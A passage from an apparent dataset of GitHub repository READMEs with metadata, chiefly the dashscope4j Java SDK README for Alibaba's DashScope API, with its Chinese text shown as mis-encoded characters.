- [] printWriter ç­‰å…¼å®¹ä¸å¤Ÿä¼˜é›…
- [] å†…åµŒæ”¯æŒï¼Ÿ
- [] session
- [] æ³¨è§£çš„è§£ææ”¯æŒ
",0,0,8,0.0,['maven'],['maven'],2.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.tomcat.maven:tomcat7-maven-plugin,org.codehaus.mojo:cobertura-maven-plugin,org.eluder.coveralls:coveralls-maven-plugin]",1.0,1.0,0.0
Apress/ChatGPT-for-Java,main,"# Apress Source Code

This repository accompanies [*ChatGPT for Java*](https://www.link.springer.com/book/10.1007/979-8-8688-0116-7) by Bruce Hopkins (Apress, 2024).

[comment]: #cover
![Cover image](979-8-8688-0115-0.jpg)

Download the files as a zip using the green button, or clone the repository to your machine using Git.

## Releases

Release v1.0 corresponds to the code in the published book, without corrections or updates.

## Contributions

See the file Contributing.md for more information on how you can contribute to this repository.",1,0,1,0.0,"['apress', 'source', 'code', 'release', 'contribution']","['apress', 'source', 'code', 'release', 'contribution']",1.0,[],0.0,1.0,0.0
oldmanpushcart/dashscope4j,main,"# DashScope4jï¼šçµç§¯ Java SDK

![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-é€šä¹‰åƒé—®](https://img.shields.io/badge/LLM-%E9%80%9A%E4%B9%89%E5%8D%83%E9%97%AE-blue.svg)

`DashScope4j`æ˜¯ä¸€ä¸ªå¼€æºçš„çµç§¯éå®˜æ–¹ Java SDKï¼ŒåŸºäº JDK17
æ„å»ºã€‚å®ƒæ—¨åœ¨æä¾›ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œã€æ˜“äºé›†æˆå’Œä½¿ç”¨çµç§¯APIï¼ˆé€šä¹‰åƒé—®æ¨¡å‹ï¼‰çš„Javaåº“ï¼Œä»¥ä¾¿å¼€å‘è€…èƒ½å¤Ÿé€šçµç§¯APIè½»æ¾å®ç°å¤šæ¨¡æ€å¯¹è¯ã€å‘é‡åµŒå…¥å’Œå›¾åƒå¤„ç†ç­‰åŠŸèƒ½ã€‚

> è¯·æ³¨æ„ï¼šåœ¨ä½¿ç”¨ DashScope4j æ—¶ï¼Œä½ éœ€è¦éµå®ˆçµç§¯APIçš„ä½¿ç”¨æ¡æ¬¾å’Œæ¡ä»¶ã€‚

## ä¾èµ–ä½¿ç”¨

```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>dashscope4j</artifactId>
    <version>2.2.1</version>
</dependency>
```

## é‡è¦æ›´æ–°

- **2.2.1ï¼š** é—®é¢˜ä¿®å¤ç‰ˆæœ¬ï¼Œä¿®å¤é—®é¢˜ #19 #18

- **2.2.0ï¼š** è¯­éŸ³è¯†åˆ«ä¸åˆæˆæ”¯æŒ
  > [ä¾‹å­ï¼šå¦‚ä½•ç”¨é€šä¹‰åƒé—®åšä¸€ä¸ªåŒå£°ä¼ è¯‘](https://github.com/oldmanpushcart/dashscope4j/wiki/Example-SimulaTrans)
  - æ–°å¢åŒå·¥æ•°æ®äº¤äº’æ“ä½œæ¥å£`Exchange`ï¼Œç”¨äºæ”¯æŒè¯­éŸ³ã€è§†é¢‘ç­‰å¤šæ¨¡æ€æ¨¡å‹äº¤äº’
  - æ”¯æŒå®æ—¶è¯­éŸ³è¯†åˆ«
  - æ”¯æŒå®æ—¶è¯­éŸ³åˆæˆ
  - æ”¯æŒéŸ³è§†é¢‘è½¬å½•
  - æ”¯æŒè¿œç¨‹ã€æœ¬åœ°Tokenizer
  - ä¼˜åŒ–éƒ¨åˆ†APIï¼Œå­˜åœ¨ä¸å‘ä¸‹å…¼å®¹å¯èƒ½
    - æ‰€æœ‰å¯¹å¤–æš´éœ²çš„`CompletableFuture`å˜æ›´ä¸º`CompletionStage`ï¼Œè§£å†³æš´éœ²æ¥å£åŠŸèƒ½è¿‡äºå¼ºå¤§çš„é—®é¢˜
    - å¢åŠ `HttpApiRequest / Response`å’Œ`ExchangeApiRequest / Response`çš„APIåˆ†å±‚ï¼Œä¸ºäº†æ›´å¥½åœ°æ”¯æŒå¤šæ¨¡æ€æ•°æ®äº¤äº’åšå‡†å¤‡

- **2.1.0ï¼š** ä¸å…¼å®¹APIä¿®å¤
    - ä¿®å¤æ¨¡å—ä¸­é”™è¯¯çš„exportsï¼Œè¯¥ä¿®å¤ä¼šå°†æ¨¡å—ä¸­ä¸åº”è¯¥æš´éœ²çš„å†…éƒ¨apié‡æ–°æ”¶å›ã€‚æœ¬æ¬¡ä¿®å¤ä¸å‘ä¸‹å…¼å®¹ã€‚
    - ä¿®å¤ChatRequestä¸­å‡½æ•°è°ƒç”¨å› ä¸ºMessageåºåˆ—åŒ–é—®é¢˜ä¸¢å¤±PluginCallã€Pluginã€ToolCallã€Toolç­‰ä¿¡æ¯çš„BUG

- **2.0.0ï¼š** å¤§ç‰ˆæœ¬é‡æ„ã€‚æ ¸å¿ƒAPIè¿›è¡Œä¸å…¼å®¹è°ƒæ•´å’Œå®ç°é‡æ„ï¼ˆè¯·æ³¨æ„ï¼‰ï¼Œåˆ é™¤1.x.xç‰ˆæœ¬è¢«æ ‡è®°ä¸ºå·²åºŸå¼ƒçš„æ–¹æ³•
    - é‡æ„æ‹¦æˆªå™¨æ¥å£å’Œå®ç°é‡æ„ï¼Œå¹¶æ·»åŠ äº†æµæ§ã€é‡è¯•ç­‰æ‹¦æˆªå™¨å®ç°
    - è°ƒæ•´éƒ¨åˆ†ç±»ã€APIçš„ä½ç½®å’Œå‘½åï¼›åˆ é™¤å·²åºŸå¼ƒçš„æ–¹æ³•
    - Flowç›¸å…³å®ç°è¿›è¡Œé‡æ„

- **1.x.xï¼š** å†ä»£ç‰ˆæœ¬æ ¸å¿ƒåŠŸèƒ½
    - **1.4.0ï¼š** æ”¯æŒæ— æ„Ÿä¸´æ—¶ç©ºé—´ã€è¯·æ±‚å’Œåº”ç­”æ‹¦æˆªå™¨
    - **1.3.0ï¼š** æ”¯æŒå¤šæ¨¡æ€å‘é‡è®¡ç®—
    - **1.2.0ï¼š** æ”¯æŒå¤šå‡½æ•°çº§è”è°ƒç”¨
    - **1.1.1ï¼š** ç¬¬ä¸€ä¸ªç¨³å®šç‰ˆæœ¬

### è¯­éŸ³åˆæˆ

æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è¿›è¡Œè¯­éŸ³åˆæˆï¼š

```java
// æ–‡æœ¬é›†åˆ
final var strings = new String[]{
    ""ç™½æ—¥ä¾å±±å°½ï¼Œ"",
    ""é»„æ²³å…¥æµ·æµã€‚"",
    ""æ¬²ç©·åƒé‡Œç›®ï¼Œ"",
    ""æ›´ä¸Šä¸€å±‚æ¥¼ã€‚""
};

/*
 * è¯­éŸ³åˆæˆè¯·æ±‚
 * é‡‡æ ·ç‡ï¼š16000
 * ç¼–ç æ ¼å¼ï¼šWAV(PCM)
 */
final var request = SpeechSynthesisRequest.newBuilder()
    .model(SpeechSynthesisModel.COSYVOICE_LONGXIAOCHUN_V1)
    .option(SpeechSynthesisOptions.SAMPLE_RATE, 16000)
    .option(SpeechSynthesisOptions.FORMAT, SpeechSynthesisRequest.Format.WAV)
    .build();

// ä»¥è¯­éŸ³åˆæˆè¯·æ±‚ä¸ºæ¨¡æ¿ï¼Œå¯¹æ¯ä¸ªæ–‡æœ¬ç”Ÿæˆä¸€ä¸ªè¯­éŸ³åˆæˆè¯·æ±‚
final var requests = Stream.of(strings)
    .map(string -> SpeechSynthesisRequest.newBuilder(request)
        .text(string)
        .build()
    )
    .toList();

// èšåˆæˆè¯·æ±‚å‘å¸ƒå™¨
final var requestPublisher = FlowPublishers.fromIterator(requests);

// è¿›è¡Œè¯­éŸ³åˆæˆ
client.audio().synthesis(request)

    // æ‰“å¼€è¯­éŸ³åˆæˆæ•°æ®äº¤äº’é€šé“ï¼šå…¨åŒå·¥æ¨¡å¼ï¼Œè¾“å‡ºåˆ°audio.wavæ–‡ä»¶
    .exchange(Exchange.Mode.DUPLEX, ExchangeListeners.ofPath(Path.of(""./audio.wav"")))
    
    // å‘é€è¯­éŸ³åˆæˆè¯·æ±‚åºåˆ—
    .thenCompose(exchange -> exchange.writeDataPublisher(requestPublisher))
    
    // è¯­éŸ³åˆæˆç»“æŸ
    .thenCompose(Exchange::finishing)
    
    // ç­‰å¾…é€šé“å…³é—­
    .thenCompose(Exchange::closeFuture)
    .toCompletableFuture()
    .join();
```
è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°ç”Ÿæˆçš„`audio.wav`æ–‡ä»¶ï¼Œå¯ä»¥è¯•ç€æ’­æ”¾ä¸‹ï¼Œç¬¦ä¸ç¬¦åˆä½ çš„è¦æ±‚ã€‚

å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€šè¿‡`ExchangeListeners.ofByteChannel(...)`æ–¹æ³•ï¼Œå°†è¾“å‡ºçš„å­—èŠ‚æµè½¬å…¥åˆ°ä½ æŒ‡å®šçš„`ByteChannel`ä¸­ï¼Œæ¯”å¦‚éŸ³é¢‘æ’­æ”¾è®¾å¤‡ã€‚è¿™æ ·å°±å¯ä»¥å®ç°è¯­éŸ³æ’­æ”¾ã€‚
åœ¨è¯­éŸ³åˆæˆç»“æŸåï¼Œä¸ºäº†é¿å…å¯¹é€šé“çš„å ç”¨ï¼Œéœ€è¦åŠæ—¶å…³é—­`Exchange`

å‘é€è¯­éŸ³åˆæˆç»“æŸè¯·æ±‚ï¼š
```java
exchange.finishing()
```

æœåŠ¡ç«¯æ”¶åˆ°ç»“æŸè¯·æ±‚åä¼šä¸»åŠ¨æ¥å…³é—­é€šé“ï¼Œä½ å¯ä»¥è°ƒç”¨`Exchange.closeFuture()`æ–¹æ³•æ¥è·å–å…³é—­é€šé“çš„Futureã€‚
```java
exchange.closeFuture()
```

### è¯­éŸ³è¯†åˆ«

åŸºäºä¸Šä¸€èŠ‚ ""è¯­éŸ³åˆæˆ"" çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¾—åˆ°äº†`audio.wav`ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç”¨è¯­éŸ³è¯†åˆ«æ¥è¯†åˆ«è¿™ä¸ªéŸ³é¢‘æ–‡ä»¶ã€‚

```java
// æ„å»ºéŸ³é¢‘æ–‡ä»¶çš„ByteBufferå‘å¸ƒå™¨
final var byteBufPublisher = FlowPublishers.fromURI(Path.of(""./audio.wav"").toUri());

/*
 * æ„å»ºè¯­éŸ³è¯†åˆ«è¯·æ±‚
 * é‡‡æ ·ç‡ï¼š16000
 * éŸ³é¢‘æ ¼å¼ï¼šWAV(PCM)
 */
final var request = RecognitionRequest.newBuilder()
    .model(RecognitionModel.PARAFORMER_REALTIME_V2)
    .option(RecognitionOptions.SAMPLE_RATE, 16000)
    .option(RecognitionOptions.FORMAT, RecognitionRequest.Format.WAV)
    .build();

// è¯†åˆ«æ–‡æœ¬ç¼“å­˜
final var stringBuf = new StringBuilder();

// è¿›è¡Œè¯­éŸ³è¯†åˆ«
client.audio().recognition(request)

    // æ‰“å¼€è¯­éŸ³è¯†åˆ«æ•°æ®äº¤äº’é€šé“ï¼šå…¨åŒå·¥æ¨¡å¼ï¼Œè¾“å‡ºåˆ°æ–‡æœ¬ç¼“å­˜
    .exchange(Exchange.Mode.DUPLEX, ExchangeListeners.ofConsume(response -> {
        if (response.output().sentence().isEnd()) {
            stringBuf.append(response.output().sentence().text()).append(""\n"");
        }
    }))
    
    // å‘é€éŸ³é¢‘æ–‡ä»¶å­—èŠ‚æµæ•°æ®
    .thenCompose(exchange -> exchange.writeByteBufferPublisher(byteBufPublisher))
    
    // è¯­éŸ³è¯†åˆ«ç»“æŸ
    .thenCompose(Exchange::finishing)
    
    // ç­‰å¾…é€šé“å…³é—­
    .thenCompose(Exchange::closeFuture)
    .toCompletableFuture()
    .join();

// è¾“å‡ºè¯†åˆ«æ–‡æœ¬
System.out.println(stringBuf);
```

æ–‡æœ¬è¯†åˆ«ç»“æœä¸º

```text
ç™½æ—¥ä¾å±±å°½ï¼Œé»„æ²³å…¥æµ·æµã€‚
æ¬²ç©·åƒé‡Œç›®ï¼Œæ›´ä¸Šä¸€å±‚æ¥¼ã€‚
```

### éŸ³è§†é¢‘è½¬å½•

éŸ³è§†é¢‘è½¬å½•ä¸ä»…èƒ½è½¬å½•éŸ³é¢‘æ–‡ä»¶ï¼Œè€Œä¸”è¿˜å¯ä»¥å°†è§†é¢‘æ–‡ä»¶ä¸­çš„éŸ³é¢‘è½¬å½•ä¸ºæ–‡æœ¬ã€‚è¿™å°±çœå¾—æˆ‘ä»¬ç”¨ffmpegå‰¥ç¦»è§†é¢‘ä¸­çš„éŸ³è½¨è¿™æ ·ç¹ççš„æ“ä½œäº†ã€‚
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ç”¨æˆ‘æœ€å–œæ¬¢çš„ä¸€ä¸ªåŠ¨æ¼«ã€Šé’¢ä¹‹ç‚¼é‡‘æœ¯å£«ã€‹æ¥æ¼”ç¤ºå¦‚ä½•ä»é€šè¿‡éŸ³è§†é¢‘è½¬å½•åŠŸèƒ½è¯†åˆ«è§†é¢‘éŸ³è½¨çš„æ–‡æœ¬ä¿¡æ¯ã€‚

> è¿™å¯¹ç”¨AIåšå­—å¹•å¤šå°‘æœ‰ç‚¹å¯å‘ï¼Œæ¯•ç«Ÿè°æ²¡æœ‰å‡ ä¸ªæ²¡æœ‰å­—å¹•çš„åŠ¨ä½œç‰‡å‘¢ï¼Ÿ

```java
/*
 * æ„å»ºéŸ³è§†é¢‘è½¬å½•è¯·æ±‚
 * è¯­è¨€ï¼šæ—¥æ–‡
 * é€‰é¡¹ï¼šè¿‡æ»¤è¯­æ°”è¯ï¼ˆæ—¥ç‰‡ä¸­å¾ˆå¤šä»¥åº“ä»¥åº“çš„è¯­æ°”è¯ï¼Œå„ä½æ‡‚çš„éƒ½æ‡‚ï¼‰
 */
final var request = TranscriptionRequest.newBuilder()
    .model(TranscriptionModel.PARAFORMER_V2)
    // ä¹Ÿå¯ä»¥ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ï¼Œæœ¬åœ°æ–‡ä»¶ä¼šè‡ªåŠ¨ä¸Šä¼ åˆ°DashScopeçš„ä¸´æ—¶ç©ºé—´
    .resources(List.of(URI.create(""https://ompc-storage.oss-cn-hangzhou.aliyuncs.com/dashscope4j/video/%5Bktxp%5D%5BFullmetal%20Alchemist%5D%5Bjap_chn%5D01.rmvb"")))
    .option(TranscriptionOptions.ENABLE_DISFLUENCY_REMOVAL, true)
    .option(TranscriptionOptions.LANGUAGE_HINTS, new LanguageHint[]{LanguageHint.JA})
    .build();

// è¿›è¡ŒéŸ³è§†é¢‘è½¬å½•
final var response = client.audio().transcription(request)

    // ç­‰å¾…ä»»åŠ¡å®Œæˆï¼Œæ¯éš”30sè¿›è¡Œæ£€æŸ¥ä»»åŠ¡çŠ¶æ€
    .task(Task.WaitStrategies.perpetual(Duration.ofMillis(1000L * 30)))
    .toCompletableFuture()
    .join();

// åˆå¹¶éŸ³è§†é¢‘è½¬å½•æ–‡æœ¬ï¼ˆå½“å‰åªæœ‰ä¸€ä¸ªè§†é¢‘ï¼‰
final var text = response.output().results().stream()
    .map(result-> {
    
        // ä¸‹è½½è½¬å½•ç»“æœ
        final var transcription = result.lazyFetchTranscription()
            .toCompletableFuture()
            .join();
    
        // åˆå¹¶è½¬å½•å¥å­ï¼ˆæ¯è¡Œä¸€ä¸ªå¥å­ï¼‰
        return transcription.transcripts().stream()
            .flatMap(transcript->transcript.sentences().stream())
            .map(sentence-> ""%s - %s: %s"".formatted(
                sentence.begin(),
                sentence.end(),
                sentence.text()
            ))
            .reduce((a, b) -> a + ""\n"" + b)
            .orElse("""");
    
    })
    
    // åˆå¹¶å¤šä¸ªéŸ³è§†é¢‘è½¬å½•æ–‡æœ¬ï¼Œå½“å‰åªæœ‰ä¸€ä¸ªè§†é¢‘
    .reduce((a, b) -> a + b)
    .orElse("""");

// è¾“å‡ºéŸ³è§†é¢‘è½¬å½•æ–‡æœ¬
System.out.println(text);
```

è¾“å‡ºæ‘˜å½•
```text
13920 - 19960: ã§ ã ãŸ ã‚ ã‚‹ å¤§ ä¸ˆ å¤«. 
20060 - 24620: å®Œ ç’§ ã . 
28380 - 32940: ã‚„ ã‚‹ ã. 
49480 - 58200: éŒ¬ é‡‘ è¡“ ã¨ ã¯ ç‰© è³ª ã® æ§‹ é€  ã‚’ ç† è§£ ã— åˆ† è§£ ã— å† æ§‹ ç¯‰ ã™ ã‚‹ ç§‘ å­¦ æŠ€ è¡“ ã§ ã‚ ã‚‹. 
58820 - 64900: ã ã‚Œ ã¯ ã† ã¾ ã ã™ ã‚Œ ã° é‰› ã‚Š ã‹ ã‚‰ é»„ é‡‘ ã‚’ ç”Ÿ ã¿ å‡º ã™ ã“ ã¨ ã‚‚ å¯ èƒ½ ã« ãª ã‚‹. 
65500 - 71760: ã— ã‹ ã— ç§‘ å­¦ ã§ ã‚ ã‚‹ ä»¥ ä¸Š ã ã“ ã« ã¯ å¤§ è‡ª ç„¶ ã® è¨ˆ æ¸¬ ãŒ å­˜ åœ¨ ã— ãŸ. 
75300 - 79860: è³ª é‡ ãŒ ä¸€ ã® ã‚‚ ã® ã‹ ã‚‰ ã¯ ä¸€ ã® ã‚‚ ã® ã— ã‹ ç”Ÿ ã¿ å‡º ã› ãª ã„. 
80200 - 84760: å¼· åŒ– äº¤ æ› ã« è¨ˆ æ¸¬. 
```

ä¾‹å­ä¸­é‡‡ç”¨çš„æ˜¯ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶ï¼Œä½†å®é™…ä¸Šä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶ï¼Œä¾‹å¦‚`Path.of(""./video.mp4"").toUri()`ï¼Œdashscope4jä¼šå°†è§†é¢‘æ–‡ä»¶ä¸Šä¼ åˆ°DashScopeçš„ä¸´æ—¶ç©ºé—´ã€‚

### Tokenizer

åœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†è®©AIè®°ä½ä¸Šä¸‹æ–‡ï¼Œä½ éœ€è¦æŠŠä¹‹å‰çš„èŠå¤©è®°å½•ä½œä¸ºå¯¹è¯ä¸Šä¸‹æ–‡è¾“å…¥ã€‚ä½†æ¨¡å‹çš„è¾“å…¥é•¿åº¦æœ‰é™ï¼Œæ‰€ä»¥éœ€è¦å°†ä¸Šä¸‹æ–‡è¿›è¡Œåˆ†æ®µï¼Œç„¶åè¿›è¡Œåˆ†æ®µè¾“å…¥ã€‚
æœ‰ä¸€ç§åˆ†å‰²æ–¹æ¡ˆå°±æ˜¯æ ¹æ®æ¨¡å‹èƒ½æ”¯æ’‘çš„æœ€å¤§tokenè¿›è¡Œåˆ‡åˆ†ï¼Œè¿™ä¸ªæ—¶å€™ä½ å°±éœ€è¦ä¸€ä¸ªå·¥å…·æ¥è®¡ç®—ä¸€æ®µæ–‡æœ¬çš„tokenæ•°åˆ°åº•æ˜¯å¤šå°‘ï¼Œä»¥è¾¾åˆ°æœ€å¤§åŒ–ä¿ç•™è®°å¿†çš„åˆ†å‰²ç›®çš„ã€‚

Tokenizerå·¥å…·èƒ½å¾ˆå¥½çš„å¸®åŠ©ä½ å®ç°è¿™ä¸€ç‚¹ï¼Œä»–åˆ†è¿œç¨‹å’Œæœ¬åœ°ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œè¿œç¨‹æ€§èƒ½è¾ƒå·®ä½†è®¡ç®—çš„tokenä¼šæ›´ç²¾å‡†ï¼Œæœ¬åœ°æ€§èƒ½æœ€ä½³ï¼Œä½†ä¼šå­˜åœ¨ä¸€å®šçš„ç‰ˆæœ¬æ»åæ€§ã€‚
ä¸åŒçš„æ¨¡å‹ï¼ŒåŒæ ·çš„æ–‡å­—ï¼Œè®¡ç®—çš„tokenå¯èƒ½ä¸ä¸€æ ·ã€‚ä½†å¤§å·®ä¸å·®ã€‚

åœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ¨èä½¿ç”¨æœ¬åœ°è®¡ç®—çš„æ–¹æ¡ˆã€‚

#### è¿œç¨‹è®¡ç®—

```java
final var messages = List.of(
    Message.ofUser(""åŒ—äº¬æœ‰å“ªäº›å¥½ç©åœ°æ–¹ï¼Ÿ""),
    Message.ofAi(""æ•…å®«ã€é¢å’Œå›­ã€å¤©å›ç­‰éƒ½æ˜¯å¯ä»¥å»æ¸¸ç©çš„æ™¯ç‚¹å“¦ã€‚""),
    Message.ofUser(""å¸®æˆ‘å®‰æ’ä¸€äº›è¡Œç¨‹"")
);

// è¿œç¨‹è°ƒç”¨éœ€è¦æ˜ç¡®ç®—æ³•æ¨¡å‹
final var list = client.base().tokenize().remote(ChatModel.QWEN_PLUS)
    .encode(messages)
    .toCompletableFuture()
    .join();

System.out.println(""total tokens: "" + list.size());
```

#### æœ¬åœ°è®¡ç®—

```java
final var messages = List.of(
    Message.ofUser(""åŒ—äº¬æœ‰å“ªäº›å¥½ç©åœ°æ–¹ï¼Ÿ""),
    Message.ofAi(""æ•…å®«ã€é¢å’Œå›­ã€å¤©å›ç­‰éƒ½æ˜¯å¯ä»¥å»æ¸¸ç©çš„æ™¯ç‚¹å“¦ã€‚""),
    Message.ofUser(""å¸®æˆ‘å®‰æ’ä¸€äº›è¡Œç¨‹"")
);

final var list = client.base().tokenize().local()
    .encode(messages)
    .toCompletableFuture()
    .join();

System.out.println(""total tokens: "" + list.size());
```

## ä¸€ã€ä¸»è¦åŠŸèƒ½

`DashScope4j`æ”¯æŒä»¥ä¸‹APIåŠŸèƒ½ï¼š

- **å¯¹è¯ï¼ˆChatï¼‰**
    - æä¾›ç”¨æˆ·ä¸çµç§¯è¿›è¡Œå¤šæ¨¡æ€(å›¾ã€æ–‡)å¯¹è¯
    - æä¾›ç”¨æˆ·ä¸çµç§¯è¿›è¡Œå¤šæ¨¡æ€(å›¾ã€éŸ³)å¯¹è¯
    - æä¾›ç”¨æˆ·ä¸çµç§¯è¿›è¡Œå‡½æ•°å¯¹è¯

- **å‘é‡ï¼ˆEmbeddingsï¼‰**
    - å°†æ–‡æœ¬è½¬æ¢ä¸ºå‘é‡è¡¨ç¤ºï¼Œç”¨äºæ–‡æœ¬ç›¸ä¼¼åº¦æ¯”è¾ƒã€èšç±»ç­‰ä»»åŠ¡
    - å°†å›¾éŸ³æ–‡æœ¬è½¬æ¢ä¸ºå‘é‡è¡¨ç¤ºï¼Œç”¨äºå›¾éŸ³æ–‡ç›¸ä¼¼åº¦æ¯”è¾ƒã€èšç±»ç­‰ä»»åŠ¡

- **å›¾åƒï¼ˆImagesï¼‰**
    - **æ–‡ç”Ÿå›¾ï¼š** å°†æ–‡æœ¬æè¿°è½¬æ¢ä¸ºç›¸åº”çš„å›¾åƒ

- **è¯­éŸ³è¯†åˆ«ä¸åˆæˆ**
  - æ”¯æŒå®æ—¶è¯­éŸ³è¯†åˆ«
  - æ”¯æŒå®æ—¶è¯­éŸ³åˆæˆ
  - æ”¯æŒéŸ³è§†é¢‘è½¬å½•

- **åŸºç¡€åŠŸèƒ½**
  - æ”¯æŒTokenizerè®¡ç®—ï¼ˆè¿œç¨‹ã€æœ¬åœ°ï¼‰
  - æ”¯æŒçµç§¯æä¾›çš„ä¸´æ—¶ç©ºé—´
  - è¯·æ±‚ã€åº”ç­”æ‹¦æˆªå™¨

- **æ’ä»¶åº”ç”¨ï¼ˆPluginï¼‰**
    - **OCRæ’ä»¶ï¼š** å›¾åƒç†è§£è¯†åˆ«ï¼Œå¹¶å¯¹å›¾åƒå†…å®¹è¿›è¡Œæ€»ç»“æ¦‚è¿°ï¼Œè¾“å‡ºç”¨æˆ·å¯ç†è§£çš„å¥å­æˆ–æ®µè½
    - **PDFè§£ææ’ä»¶ï¼š** å¯¹PDFæ–‡ä»¶è¿›è¡Œè§£æï¼Œæå–ã€ç†è§£æ–‡æœ¬å†…å®¹
    - **è®¡ç®—å™¨æ’ä»¶ï¼š** å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°å­¦è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—
    - **æ–‡ç”Ÿå›¾æ’ä»¶ï¼š** å°†æ–‡æœ¬æè¿°è½¬æ¢ä¸ºç›¸åº”çš„å›¾åƒ

## äºŒã€ç³»ç»Ÿè¦æ±‚

1. **JDK17**æˆ–æ›´é«˜ç‰ˆæœ¬

## ä¸‰ã€è·‘é€šæµ‹è¯•

1. åˆ°é˜¿é‡Œäº‘çš„[æ¨¡å‹æœåŠ¡-çµç§¯](https://dashscope.console.aliyun.com/)ä¸­å¼€é€šæœåŠ¡ï¼Œè·å–`AK`
2. åˆ°[API-KEYç®¡ç†]()ä¸­åˆ›å»ºä¸€ä¸ª`API-KEY`ï¼Œè·å–å…¶`AK`
3. å£°æ˜ç¯å¢ƒå˜é‡`export DASHSCOPE_AK=<YOUR APP-KEY>`
4. è¿è¡Œæµ‹è¯•ç”¨ä¾‹ï¼š`mvn test`

## å››ã€ä½¿ç”¨ç¤ºä¾‹

### åˆ›å»ºå®¢æˆ·ç«¯

```java

// çº¿ç¨‹æ± 
final var executor = Executors.newFixedThreadPool(10);

// åˆ›å»ºå®¢æˆ·ç«¯
final var client = DashScopeClient.newBuilder()
    .ak(""<YOUR APP-KEY>"")
    .executor(executor)
    .build();
```

### å¯¹è¯ç¤ºä¾‹ï¼ˆå¼‚æ­¥ï¼‰

```java
// åˆ›å»ºè¯·æ±‚
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""å›¾ç‰‡ä¸­ä¸€å…±å¤šå°‘è¾†è‡ªè¡Œè½¦?"")
        ))
    ))
    .build();

// å¼‚æ­¥åº”ç­”
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();

// è¾“å‡ºç»“æœï¼ˆå¼‚æ­¥ï¼‰
System.out.println(response.output().best().message().text());
```

è¾“å‡ºæ—¥å¿—

```text
2024-02-29 00:49:56 DEBUG dashscope://chat/qwen-vl-max => {""model"":""qwen-vl-max"",""input"":{""messages"":[{""role"":""user"",""content"":[{""image"":""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg""},{""text"":""å›¾ç‰‡ä¸­ä¸€å…±å¤šå°‘è¾†è‡ªè¡Œè½¦?""}]}]},""parameters"":{}}
2024-02-29 00:49:59 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":[{""text"":""å›¾ç‰‡ä¸­æœ‰ä¸¤è¾†è‡ªè¡Œè½¦ã€‚""}]}}]},""usage"":{""output_tokens"":7,""input_tokens"":1264,""image_tokens"":1230},""request_id"":""f11e20f0-6774-9649-a0c9-6095e6287cdc""}
å›¾ç‰‡ä¸­æœ‰ä¸¤è¾†è‡ªè¡Œè½¦ã€‚
```

### å¯¹è¯ç¤ºä¾‹ï¼ˆæµå¼ï¼‰

```java
// åˆ›å»ºè¯·æ±‚
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .option(ChatOptions.ENABLE_INCREMENTAL_OUTPUT, true)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""å›¾ç‰‡ä¸­ä¸€å…±å¤šå°‘è¾†è‡ªè¡Œè½¦?"")
        ))
    ))
    .build();

// æµå¼åº”ç­”
final var publisher = client.chat(request)
    .flow()
    .toCompletableFuture()
    .join();

// åº”ç­”è¾“å‡ºï¼ˆæµå¼ï¼‰
final var latch = new CountDownLatch(1);
final var stringSB = new StringBuilder();
publisher.subscribe(new Flow.Subscriber<>(){

    @Override
    public void onSubscribe(Flow.Subscription subscription) {
        subscription.request(Long.MAX_VALUE);
    }
    
    @Override
    public void onNext(ChatResponse response) {
        stringSB.append(response.output().best().message().text());
    }
    
    @Override
    public void onError(Throwable ex) {
        ex.printStackTrace(System.err);
    }
    
    @Override
    public void onComplete() {
        latch.countDown();
    }

});

// ç­‰å¾…å¤„ç†å®Œæˆ
latch.await();
System.out.println(stringSB);
```

è¾“å‡ºæ—¥å¿—

```text
2024-02-29 01:21:42 DEBUG dashscope://chat/qwen-vl-max => {""model"":""qwen-vl-max"",""input"":{""messages"":[{""role"":""user"",""content"":[{""image"":""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg""},{""text"":""å›¾ç‰‡ä¸­ä¸€å…±å¤šå°‘è¾†è‡ªè¡Œè½¦?""}]}]},""parameters"":{""incremental_output"":true}}
2024-02-29 01:21:44 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""å›¾ç‰‡""}],""role"":""assistant""},""finish_reason"":""null""}]},""usage"":{""input_tokens"":1264,""output_tokens"":1,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
2024-02-29 01:21:44 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""ä¸­æœ‰""}],""role"":""assistant""},""finish_reason"":""null""}]},""usage"":{""input_tokens"":1264,""output_tokens"":2,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
